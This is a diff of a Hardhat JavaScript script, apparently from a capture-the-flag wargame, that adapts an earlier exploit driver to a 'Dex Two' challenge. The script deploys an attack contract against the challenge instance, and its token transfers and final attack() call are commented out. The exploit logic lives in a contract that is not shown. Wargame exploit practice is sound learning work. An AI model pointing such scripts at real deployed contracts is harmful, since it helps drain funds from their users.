@@ -1,13 +1,15 @@
-const { dex: dexInstanceConstant } = require('../instanceAddresses.json');
-const { abi: dexAbi } = require('../artifacts/contracts/Dex.sol/Dex.json');
+const { dexTwo: dexInstanceConstant } = require('../instanceAddresses.json');
+const {
+  abi: dexAbi,
+} = require('../artifacts/contracts/DexTwo.sol/DexTwo.json');
 const {
   abi: tokenAbi,
-} = require('../artifacts/contracts/Dex.sol/SwappableToken.json');
+} = require('../artifacts/contracts/DexTwo.sol/SwappableTokenTwo.json');
 const {
   abi: dexAttackAbi,
-} = require('../artifacts/contracts/Dex.sol/DexAttack.json');
+} = require('../artifacts/contracts/DexTwo.sol/DexTwoAttack.json');
 const { verify } = require('../utils/verify');
-const { resetDex } = require('../reset/resetDex');
+const { resetDexTwo } = require('../reset/resetDexTwo');
 
 const getDexBalance = async (dex, token1Contract, token2Contract) => {
   const token1Balance = await token1Contract.balanceOf(dex);
@@ -17,14 +19,14 @@ const getDexBalance = async (dex, token1Contract, token2Contract) => {
   return { token1Balance, token2Balance };
 };
 
-const isResetDex = false;
+const isResetDexTwo = false;
 
-const dexAttack = async () => {
-  console.log('Hacking Dex...');
+const dexTwoAttack = async () => {
+  console.log('Hacking Dex Two...');
   let dexInstance;
   // Reset dex (if needed)
-  if (isResetDex) {
-    dexInstance = await resetDex();
+  if (isResetDexTwo) {
+    dexInstance = await resetDexTwo();
   } else {
     dexInstance = dexInstanceConstant;
   }
@@ -49,24 +51,24 @@ const dexAttack = async () => {
 
   // Deploy attack contract
   const dexAttackArgs = [dexInstance, token1, token2];
-  const DexAttack = await ethers.getContractFactory('DexAttack');
+  const DexAttack = await ethers.getContractFactory('DexTwoAttack');
   const dexAttack = await DexAttack.deploy(...dexAttackArgs);
   await dexAttack.deployed();
   console.log('dexAttack deployed to:', dexAttack.address);
   //   await verify(dexAttack.address, dexAttackArgs);
 
   // Transfer our 10 wei tokens to attack contract
-  const txn1 = await token1Contract.transfer(dexAttack.address, '10');
-  await txn1.wait();
-  const txn2 = await token2Contract.transfer(dexAttack.address, '10');
-  await txn2.wait();
-  console.log('Tokens transferred to attack contract.');
+  //   const txn1 = await token1Contract.transfer(dexAttack.address, '10');
+  //   await txn1.wait();
+  //   const txn2 = await token2Contract.transfer(dexAttack.address, '10');
+  //   await txn2.wait();
+  //   console.log('Tokens transferred to attack contract.');
 
   // Got him now
   //   await dexAttack.attack();
 };
 
-dexAttack().catch((error) => {
+dexTwoAttack().catch((error) => {
   console.error(error);
   process.exit(1);
 });
